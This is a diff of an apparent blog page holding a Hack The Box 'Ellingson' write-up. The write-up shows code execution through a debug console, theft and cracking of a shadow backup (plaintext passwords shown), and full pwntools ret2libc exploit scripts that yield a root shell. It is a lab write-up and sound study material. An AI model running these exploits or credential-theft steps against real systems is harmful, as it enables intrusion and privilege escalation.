@@ -103,7 +103,7 @@ require the exploitation of a ROP buffer overflow.</p>
 
 <h1 id="recon">Recon</h1>
 <p>We start with an nmap scan. Only the ports 22 (SSH) and 80 (HTTP) are open.</p>
-<div class="highlight"><pre><span class="code-line"><span></span># Nmap 7.80 scan initiated Thu Sep 26 13:34:45 2019 as: nmap -oA 10.10.10.139 -sSV 10.10.10.139</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code># Nmap 7.80 scan initiated Thu Sep 26 13:34:45 2019 as: nmap -oA 10.10.10.139 -sSV 10.10.10.139</span>
 <span class="code-line">Nmap scan report for 10.10.10.139</span>
 <span class="code-line">Host is up (0.086s latency).</span>
 <span class="code-line">Not shown: 998 filtered ports</span>
@@ -114,7 +114,7 @@ require the exploitation of a ROP buffer overflow.</p>
 <span class="code-line"></span>
 <span class="code-line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
 <span class="code-line"># Nmap done at Thu Sep 26 13:35:00 2019 -- 1 IP address (1 host up) scanned in 14.76 seconds</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <h1 id="web">Web</h1>
@@ -129,7 +129,7 @@ interpretor:</p>
 <p>From there we can input python's commands and using the <code>OS</code> module we can
 execute command on the system. In order to get a shell we can simply upload our
 SSH public key in the current user (hal) <code>authorized_keys</code> file.</p>
-<div class="highlight"><pre><span class="code-line"><span></span>&gt;&gt;&gt; import os; os.popen(&#39;whoami&#39;).read()</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>&gt;&gt;&gt; import os; os.popen(&#39;whoami&#39;).read()</span>
 <span class="code-line">&#39;hal\n&#39;</span>
 <span class="code-line">&gt;&gt;&gt; import os; os.system(&#39;mkdir ~/.ssh/&#39;)</span>
 <span class="code-line">256</span>
@@ -137,21 +137,21 @@ SSH public key in the current user (hal) <code>authorized_keys</code> file.</p>
 <span class="code-line">0</span>
 <span class="code-line">&gt;&gt;&gt; import os; os.system(&#39;chmod 644 ~/.ssh/authorized_keys&#39;)</span>
 <span class="code-line">0</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>As our SSH public key is in hal's <code>authorzied_key</code> we can connect as hal using
 SSH and starting to enumerate. The user flag is not in the hal's home folder:</p>
-<div class="highlight"><pre><span class="code-line"><span></span>sh 10.10.10.139 -lhal</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>sh 10.10.10.139 -lhal</span>
 <span class="code-line">hal@ellingson:~$ whoami</span>
 <span class="code-line">hal</span>
 <span class="code-line">hal@ellingson:~$ ls /home/</span>
 <span class="code-line">duke  hal  margo  theplague</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>We enumerate the box and find an interesting non standard SUID binary:</p>
-<div class="highlight"><pre><span class="code-line"><span></span>hal@ellingson:~$ find / -uid 0 -perm -4000 -type f 2&gt;/dev/null</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>hal@ellingson:~$ find / -uid 0 -perm -4000 -type f 2&gt;/dev/null</span>
 <span class="code-line">/usr/bin/newgrp</span>
 <span class="code-line">/usr/bin/pkexec</span>
 <span class="code-line">/usr/bin/passwd</span>
@@ -175,21 +175,21 @@ SSH and starting to enumerate. The user flag is not in the hal's home folder:</p
 <span class="code-line">/bin/ping</span>
 <span class="code-line">/bin/mount</span>
 <span class="code-line">/bin/fusermount</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>Nevertheless we do not have the permission to execute it:</p>
-<div class="highlight"><pre><span class="code-line"><span></span>hal@ellingson:~$ ls -al /usr/bin/garbage</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>hal@ellingson:~$ ls -al /usr/bin/garbage</span>
 <span class="code-line">-rwsr-xr-x 1 root root 18056 Mar  9  2019 /usr/bin/garbage</span>
 <span class="code-line">hal@ellingson:~$ /usr/bin/garbage</span>
 <span class="code-line">User is not authorized to access this application. This attempt has been logged.</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>We need another way. We see that we are in the group <code>adm</code> (in addition to our user group):</p>
-<div class="highlight"><pre><span class="code-line"><span></span>hal@ellingson:~$ id</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>hal@ellingson:~$ id</span>
 <span class="code-line">uid=1001(hal) gid=1001(hal) groups=1001(hal),4(adm)</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p><strong>I struggled for a long time here before someone on the official discord told
@@ -197,7 +197,7 @@ me that after a few hours
 the file permissions are changed and the file does not belong to <code>adm</code> group
 anymore. I had to reset the box to find this file.</strong></p>
 <p>Let us list what files are belonging to this group:</p>
-<div class="highlight"><pre><span class="code-line"><span></span>hal@ellingson:~$ find / -group adm 2&gt; /dev/null</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>hal@ellingson:~$ find / -group adm 2&gt; /dev/null</span>
 <span class="code-line">/var/backups/shadow.bak</span>
 <span class="code-line">/var/spool/rsyslog</span>
 <span class="code-line">/var/log/auth.log</span>
@@ -225,11 +225,11 @@ anymore. I had to reset the box to find this file.</strong></p>
 <span class="code-line">/snap/core/6818/var/log/fsck/checkfs</span>
 <span class="code-line">/snap/core/6818/var/log/fsck/checkroot</span>
 <span class="code-line">/snap/core/6818/var/spool/rsyslog</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>We cat the shadow.bak file and get some password hashes:</p>
-<div class="highlight"><pre><span class="code-line"><span></span>hal@ellingson:~$ cat /var/backups/shadow.bak</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>hal@ellingson:~$ cat /var/backups/shadow.bak</span>
 <span class="code-line">root:*:17737:0:99999:7:::</span>
 <span class="code-line">daemon:*:17737:0:99999:7:::</span>
 <span class="code-line">bin:*:17737:0:99999:7:::</span>
@@ -263,16 +263,16 @@ anymore. I had to reset the box to find this file.</strong></p>
 <span class="code-line">hal:$6$UYTy.cHj$qGyl.fQ1PlXPllI4rbx6KM.lW6b3CJ.k32JxviVqCC2AJPpmybhsA8zPRf0/i92BTpOKtrWcqsFAcdSxEkee30:17964:0:99999:7:::</span>
 <span class="code-line">margo:$6$Lv8rcvK8$la/ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G/kbd72poeAnyJL4c1:17964:0:99999:7:::</span>
 <span class="code-line">duke:$6$bFjry0BT$OtPFpMfL/KuUZOafZalqHINNX/acVeIDiXXCPo9dPi1YHOp9AAAAnFTfEh.2AheGIvXMGMnEFl5DlTAbIzwYc/:17964:0:99999:7:::</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>Let's crack them! It is a bit long as the hashing algorithm is SHA512 ($6). We
 use <code>john</code> with the rockyou dictionary.</p>
-<div class="highlight"><pre><span class="code-line"><span></span>john hash -w=~/tools/password_lists/rockyou.txt</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>john hash -w=~/tools/password_lists/rockyou.txt</span>
 <span class="code-line">john --show hash</span>
 <span class="code-line">theplague:password123:17964:0:99999:7:::</span>
 <span class="code-line">margo:iamgod$08:17964:0:99999:7:::</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>The first password was changed, as mention in the third article:</p>
@@ -284,20 +284,20 @@ the most common passwords are. Love, Secret, Sex and God -The Plague</p>
 </blockquote>
 <p>Nevertheless, we can connect as <code>margo</code> using SSH and the cracked password. And we
 retrieved the user flag:</p>
-<div class="highlight"><pre><span class="code-line"><span></span>ssh 10.10.10.139 -lmargo</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>ssh 10.10.10.139 -lmargo</span>
 <span class="code-line">margo@10.10.10.139&#39;s password:</span>
 <span class="code-line">Last login: Wed Oct  2 12:25:47 2019 from 10.10.15.42</span>
 <span class="code-line">margo@ellingson:~$ ls</span>
 <span class="code-line">user.txt</span>
 <span class="code-line">margo@ellingson:~$ cat user.txt</span>
 <span class="code-line">d0ff9e&lt;redacted&gt;</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <h1 id="root">Root</h1>
 <h2 id="finding-the-suid-binary">Finding the SUID binary</h2>
 <p>Let's get back to the SUID binary:</p>
-<div class="highlight"><pre><span class="code-line"><span></span>margo@ellingson:~$ find / -uid 0 -perm -4000 -type f 2&gt;/dev/null</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>margo@ellingson:~$ find / -uid 0 -perm -4000 -type f 2&gt;/dev/null</span>
 <span class="code-line">/usr/bin/newgrp</span>
 <span class="code-line">/usr/bin/pkexec</span>
 <span class="code-line">/usr/bin/passwd</span>
@@ -307,13 +307,13 @@ retrieved the user flag:</p>
 <span class="code-line">/usr/bin/sudo</span>
 <span class="code-line">/usr/bin/traceroute6.iputils</span>
 <span class="code-line">/usr/bin/chfn</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>We run the binary, it ask for a password user input. If we put a wrong password
 we get an access denied. If we put a "long" password we get a segfault. This
 look like a buffer overflow:</p>
-<div class="highlight"><pre><span class="code-line"><span></span>margo@ellingson:~$ /usr/bin/garbage</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>margo@ellingson:~$ /usr/bin/garbage</span>
 <span class="code-line">Enter access password: test</span>
 <span class="code-line"></span>
 <span class="code-line">access denied.</span>
@@ -322,16 +322,16 @@ look like a buffer overflow:</p>
 <span class="code-line"></span>
 <span class="code-line">access denied.</span>
 <span class="code-line">Segmentation fault (core dumped)</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>Let's copy the binary on our machine:</p>
-<div class="highlight"><pre><span class="code-line"><span></span>scp margo@10.10.10.139:/usr/bin/garbage ./</span>
-</pre></div>
+<div class="highlight"><pre><span class="code-line"><span></span><code>scp margo@10.10.10.139:/usr/bin/garbage ./</span>
+<span class="code-line"></code></pre></div>
 
 
 <p>We check the flags of the binary:</p>
-<div class="highlight"><pre><span class="code-line"><span></span>root@kalili:~# gdb ./garbage</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>root@kalili:~# gdb ./garbage</span>
 <span class="code-line">&lt;snip&gt;</span>
 <span class="code-line">gdb-peda$ checksec</span>
 <span class="code-line">CANARY    : disabled</span>
@@ -339,27 +339,27 @@ look like a buffer overflow:</p>
 <span class="code-line">NX        : ENABLED</span>
 <span class="code-line">PIE       : disabled</span>
 <span class="code-line">RELRO     : Partial</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>The No-Execute bit is set. Therefore we need to use a ret2lib.</p>
 <p>The ASLR is activated on the server:</p>
-<div class="highlight"><pre><span class="code-line"><span></span>margo@ellingson:~$ cat /proc/sys/kernel/randomize_va_space</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>margo@ellingson:~$ cat /proc/sys/kernel/randomize_va_space</span>
 <span class="code-line">2</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>As ASLR is on and the NX bit (no-execute) is set we will also need the box libc
 to do a ROP:</p>
-<div class="highlight"><pre><span class="code-line"><span></span>scp margo@10.10.10.139:/lib/x86_64-linux-gnu/libc.so.6 ./</span>
-</pre></div>
+<div class="highlight"><pre><span class="code-line"><span></span><code>scp margo@10.10.10.139:/lib/x86_64-linux-gnu/libc.so.6 ./</span>
+<span class="code-line"></code></pre></div>
 
 
 <h2 id="analysing-the-buffer-overflow">Analysing the Buffer Overflow</h2>
 <p><a href="/media/2019.10/ellingson_garbage"><em>The binary is avalible here</em></a></p>
 <p>We load the binary in gdb <a href="https://github.com/longld/peda">peda</a> and search for
 the size of the buffer.</p>
-<div class="highlight"><pre><span class="code-line"><span></span>gdb-peda$ r &lt; &lt;(python -c &#39;print &quot;A&quot;*133+&quot;B&quot;+&quot;C&quot;+&quot;D&quot;+&quot;E&quot;+&quot;F&quot;+&quot;G&quot;+&quot;H&quot;+&quot;J&quot;&#39;)</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>gdb-peda$ r &lt; &lt;(python -c &#39;print &quot;A&quot;*133+&quot;B&quot;+&quot;C&quot;+&quot;D&quot;+&quot;E&quot;+&quot;F&quot;+&quot;G&quot;+&quot;H&quot;+&quot;J&quot;&#39;)</span>
 <span class="code-line">Starting program: /root/garbage &lt; &lt;(python -c &#39;print &quot;A&quot;*133+&quot;B&quot;+&quot;C&quot;+&quot;D&quot;+&quot;E&quot;+&quot;F&quot;+&quot;G&quot;+&quot;H&quot;+&quot;J&quot;&#39;)</span>
 <span class="code-line">Enter access password:</span>
 <span class="code-line">access denied.</span>
@@ -385,13 +385,13 @@ the size of the buffer.</p>
 <span class="code-line">R15: 0x0</span>
 <span class="code-line">EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction</span>
 <span class="code-line">overflow)</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>The buffer size is 136 (133+3). We could also use the peda's functions
 <code>pattern_create</code> and <code>pattern_offset</code> to find it. Then we can start to write our exploitation
 script using <a href="http://pwntools.com">pwntools</a>:</p>
-<div class="highlight"><pre><span class="code-line"><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span></span>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span></span>
 <span class="code-line"></span>
 <span class="code-line"><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./garbage&#39;</span><span class="p">)</span></span>
 <span class="code-line"></span>
@@ -408,7 +408,7 @@ script using <a href="http://pwntools.com">pwntools</a>:</p>
 <span class="code-line"><span class="nb">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span></span>
 <span class="code-line"></span>
 <span class="code-line"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>We want to get the dynamic address of <code>LIBC</code> in order to be able to call a
@@ -434,7 +434,7 @@ objdump -D garbage | grep puts
 </li>
 </ul>
 <p>We add this addresses to our exploit and output the <code>puts</code> address in <code>LIBC</code>:</p>
-<div class="highlight"><pre><span class="code-line"><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span></span>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span></span>
 <span class="code-line"></span>
 <span class="code-line"><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./garbage&#39;</span><span class="p">)</span></span>
 <span class="code-line"></span>
@@ -457,11 +457,11 @@ objdump -D garbage | grep puts
 <span class="code-line"><span class="c1"># Leaked address printed in a readable format</span></span>
 <span class="code-line"><span class="n">leaked_puts</span> <span class="o">=</span>  <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">)</span></span>
 <span class="code-line"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;Leaked puts@GLIBC: &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">leaked_puts</span><span class="p">))</span></span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>Here is the output of it (for sanity I commented the debugging option):</p>
-<div class="highlight"><pre><span class="code-line"><span></span># python exploitP.py</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code># python exploitP.py</span>
 <span class="code-line">[+] Starting local process &#39;./garbage&#39;: pid 1407</span>
 <span class="code-line">Enter access password:</span>
 <span class="code-line"></span>
@@ -487,7 +487,7 @@ objdump -D garbage | grep puts
 <span class="code-line"></span>
 <span class="code-line">[+] Leaked puts@GLIBC: @0X\x0en\x7f\x00\x00</span>
 <span class="code-line">[*] Stopped process &#39;./garbage&#39; (pid 1415)</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>We got the leaked address of the <code>puts</code> call in LIBC.
@@ -495,14 +495,14 @@ As the ASLR is on, multiple runs give us different addresses for the <code>puts<
 in LIBC. But our process logically stop. If we rerun it the address will be
 different. Therefore we need to recall our main. We get the address using
 <code>objdump</code>:</p>
-<div class="highlight"><pre><span class="code-line"><span></span>objdump -D garbage | grep main</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>objdump -D garbage | grep main</span>
 <span class="code-line">  401194:   ff 15 56 2e 00 00       callq  *0x2e56(%rip)        # 403ff0 &lt;__libc_start_main@GLIBC_2.2.5&gt;</span>
 <span class="code-line">0000000000401619 &lt;main&gt;:</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>And we add it to our script:</p>
-<div class="highlight"><pre><span class="code-line"><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span></span>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span></span>
 <span class="code-line"></span>
 <span class="code-line"><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./garbage&#39;</span><span class="p">)</span></span>
 <span class="code-line"></span>
@@ -526,16 +526,16 @@ different. Therefore we need to recall our main. We get the address using
 <span class="code-line"><span class="c1"># Leaked address printed in a readable format</span></span>
 <span class="code-line"><span class="n">leaked_puts</span> <span class="o">=</span>  <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">)</span></span>
 <span class="code-line"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;Leaked puts@GLIBC: &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">leaked_puts</span><span class="p">))</span></span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <h2 id="ret2libc-locally">ret2libc locally</h2>
 <p>We have the leak address of the <code>puts</code> call in <code>LIBC</code>. We can dynamically
 compute the offset between our leaked address and the <code>LIBC</code> address. For that
 we need to found the <code>puts</code> call in <code>LIBC</code>:</p>
-<div class="highlight"><pre><span class="code-line"><span></span># locate libc.so.6</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code># locate libc.so.6</span>
 <span class="code-line">/lib/x86_64-linux-gnu/libc.so.6</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p># readelf -s /lib/x86_64-linux-gnu/libc.so.6 |grep puts
@@ -544,23 +544,23 @@ we need to found the <code>puts</code> call in <code>LIBC</code>:</p>
 <p>The "beginning" of <code>LIBC</code> is then our leak address minus <code>0x74040</code>.</p>
 <p>We now want to call a shell, for that we need the addresses of <code>system</code> and
 <code>/bin/sh</code> in <code>LIBC</code>:</p>
-<div class="highlight"><pre><span class="code-line"><span></span># readelf -s /lib/x86_64-linux-gnu/libc.so.6 |grep system</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code># readelf -s /lib/x86_64-linux-gnu/libc.so.6 |grep system</span>
 <span class="code-line">  235: 0000000000129d20    99 FUNC    GLOBAL DEFAULT   14 svcerr_systemerr@@GLIBC_2.2.5</span>
 <span class="code-line">  613: 0000000000046ff0    45 FUNC    GLOBAL DEFAULT   14 __libc_system@@GLIBC_PRIVATE</span>
 <span class="code-line">  1421: 0000000000046ff0    45 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.2.5</span>
 <span class="code-line"># strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 |grep /bin/sh</span>
 <span class="code-line">183cee /bin/sh</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>As we want to exploit a SUID binary we also need to invoke the <code>setuid</code> call:</p>
-<div class="highlight"><pre><span class="code-line"><span></span># readelf -s /lib/x86_64-linux-gnu/libc.so.6 |grep setuid</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code># readelf -s /lib/x86_64-linux-gnu/libc.so.6 |grep setuid</span>
 <span class="code-line">    25: 00000000000c8ac0   144 FUNC    WEAK   DEFAULT   14 setuid@@GLIBC_2.2.5</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>Our exploit is now the following:</p>
-<div class="highlight"><pre><span class="code-line"><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span></span>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span></span>
 <span class="code-line"></span>
 <span class="code-line"><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./garbage&#39;</span><span class="p">)</span></span>
 <span class="code-line"></span>
@@ -608,12 +608,12 @@ we need to found the <code>puts</code> call in <code>LIBC</code>:</p>
 <span class="code-line"><span class="nb">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span></span>
 <span class="code-line"></span>
 <span class="code-line"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>When running the script we grab a shell (as I use my Kali VM on root we don't
 see a real privilege escalation):</p>
-<div class="highlight"><pre><span class="code-line"><span></span># python exploit.py</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code># python exploit.py</span>
 <span class="code-line">[+] Starting local process &#39;./garbage&#39;: pid 1909</span>
 <span class="code-line">Enter access password:</span>
 <span class="code-line"></span>
@@ -628,7 +628,7 @@ see a real privilege escalation):</p>
 <span class="code-line">[*] Switching to interactive mode</span>
 <span class="code-line">$ id</span>
 <span class="code-line">uid=0(root) gid=0(root) groups=0(root)</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <h2 id="running-the-exploit-remotely">Running the exploit remotely</h2>
@@ -637,7 +637,7 @@ the one we copy from the ellingson machine. We also need to change our process
 to use the one remote. <a href="https://github.com/Gallopsled/pwntools">Pnwtools</a> is
 perfect for that as we just need to change our <code>process</code> variable. Our final
 scrip is now:</p>
-<div class="highlight"><pre><span class="code-line"><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span></span>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span></span>
 <span class="code-line"></span>
 <span class="code-line"><span class="n">shell</span> <span class="o">=</span> <span class="n">ssh</span><span class="p">(</span><span class="s1">&#39;margo&#39;</span><span class="p">,</span> <span class="s1">&#39;10.10.10.139&#39;</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s1">&#39;iamgod$08&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">22</span><span class="p">)</span></span>
 <span class="code-line"><span class="n">p</span><span class="o">=</span><span class="n">shell</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="s1">&#39;/usr/bin/garbage&#39;</span><span class="p">])</span></span>
@@ -693,11 +693,11 @@ scrip is now:</p>
 <span class="code-line"><span class="nb">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span></span>
 <span class="code-line"></span>
 <span class="code-line"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>The output of the script give us a root shell on the machine:</p>
-<div class="highlight"><pre><span class="code-line"><span></span>root@kalili:~# python exploitR.py</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>root@kalili:~# python exploitR.py</span>
 <span class="code-line">[+] Connecting to 10.10.10.139 on port 22: Done</span>
 <span class="code-line">[*] margo@10.10.10.139:</span>
 <span class="code-line">    Distro    Ubuntu 18.04</span>
@@ -757,7 +757,7 @@ scrip is now:</p>
 <span class="code-line">    &#39;1cc73&lt;redacted&gt;\n&#39;</span>
 <span class="code-line">    &#39;# &#39;</span>
 <span class="code-line">1cc73&lt;redacterd&gt;</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <h1 id="wrapping-up">Wrapping up</h1>
@@ -768,7 +768,7 @@ the possibility to exploit a remote binary so easily is something precious.</p>
 <h2 id="automated-pwn">Automated pwn</h2>
 <p>We can also use <a href="http://pwntools.com">pwntools</a> to fully automate the exploit
 and make it compute the addresses automatically:</p>
-<div class="highlight"><pre><span class="code-line"><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span></span>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span></span>
 <span class="code-line"></span>
 <span class="code-line"><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./garbage&#39;</span><span class="p">,</span> <span class="n">setuid</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span></span>
 <span class="code-line"></span>
@@ -804,7 +804,7 @@ and make it compute the addresses automatically:</p>
 <span class="code-line"><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span> <span class="c1"># wait until break line</span></span>
 <span class="code-line"><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span> <span class="c1"># wait until access denied</span></span>
 <span class="code-line"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>But this won't "fully" work as the SUID part is not in it.</p>
@@ -890,139 +890,52 @@ and make it compute the addresses automatically:</p>
 
     <ul>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/screen.html">screen</a>
+              <a href="https://maggick.fr/tag/suid.html">SUID</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/cygwin.html">cygwin</a>
-            </li>
-            <li class="tag tag-1">
-              <a href="https://maggick.fr/tag/vulnhub.html">vulnhub</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/gogs.html">gogs</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/bruteforce.html">bruteforce</a>
-            </li>
-            <li class="tag tag-1">
-              <a href="https://maggick.fr/tag/security.html">security</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/osmc.html">osmc</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/vault.html">vault</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/centreon.html">centreon</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/gitlab.html">gitlab</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/hash.html">hash</a>
-            </li>
-            <li class="tag tag-2">
-              <a href="https://maggick.fr/tag/htb.html">HTB</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/bypass.html">bypass</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/exchange.html">exchange</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/lorem-ipsum.html">lorem ipsum</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/postgresql.html">postgresql</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/sqli.html">SQLi</a>
-            </li>
-            <li class="tag tag-3">
-              <a href="https://maggick.fr/tag/ctf.html">ctf</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/metasploit.html">metasploit</a>
-            </li>
-            <li class="tag tag-3">
-              <a href="https://maggick.fr/tag/cve.html">cve</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/microsoft.html">microsoft</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/cryptography.html">cryptography</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/msfvenom.html">msfvenom</a>
+              <a href="https://maggick.fr/tag/sstic.html">sstic</a>
             </li>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/api.html">api</a>
             </li>
             <li class="tag tag-2">
-              <a href="https://maggick.fr/tag/misc.html">misc</a>
+              <a href="https://maggick.fr/tag/htb.html">HTB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/ndh.html">ndh</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/gitlab.html">gitlab</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/ret2libc.html">ret2libc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/vault.html">vault</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/bruteforce.html">bruteforce</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/buffer-overflow.html">buffer overflow</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/microsoft.html">microsoft</a>
             </li>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/procdump.html">procdump</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/reverse.html">reverse</a>
+              <a href="https://maggick.fr/tag/lorem-ipsum.html">lorem ipsum</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/kiosk.html">kiosk</a>
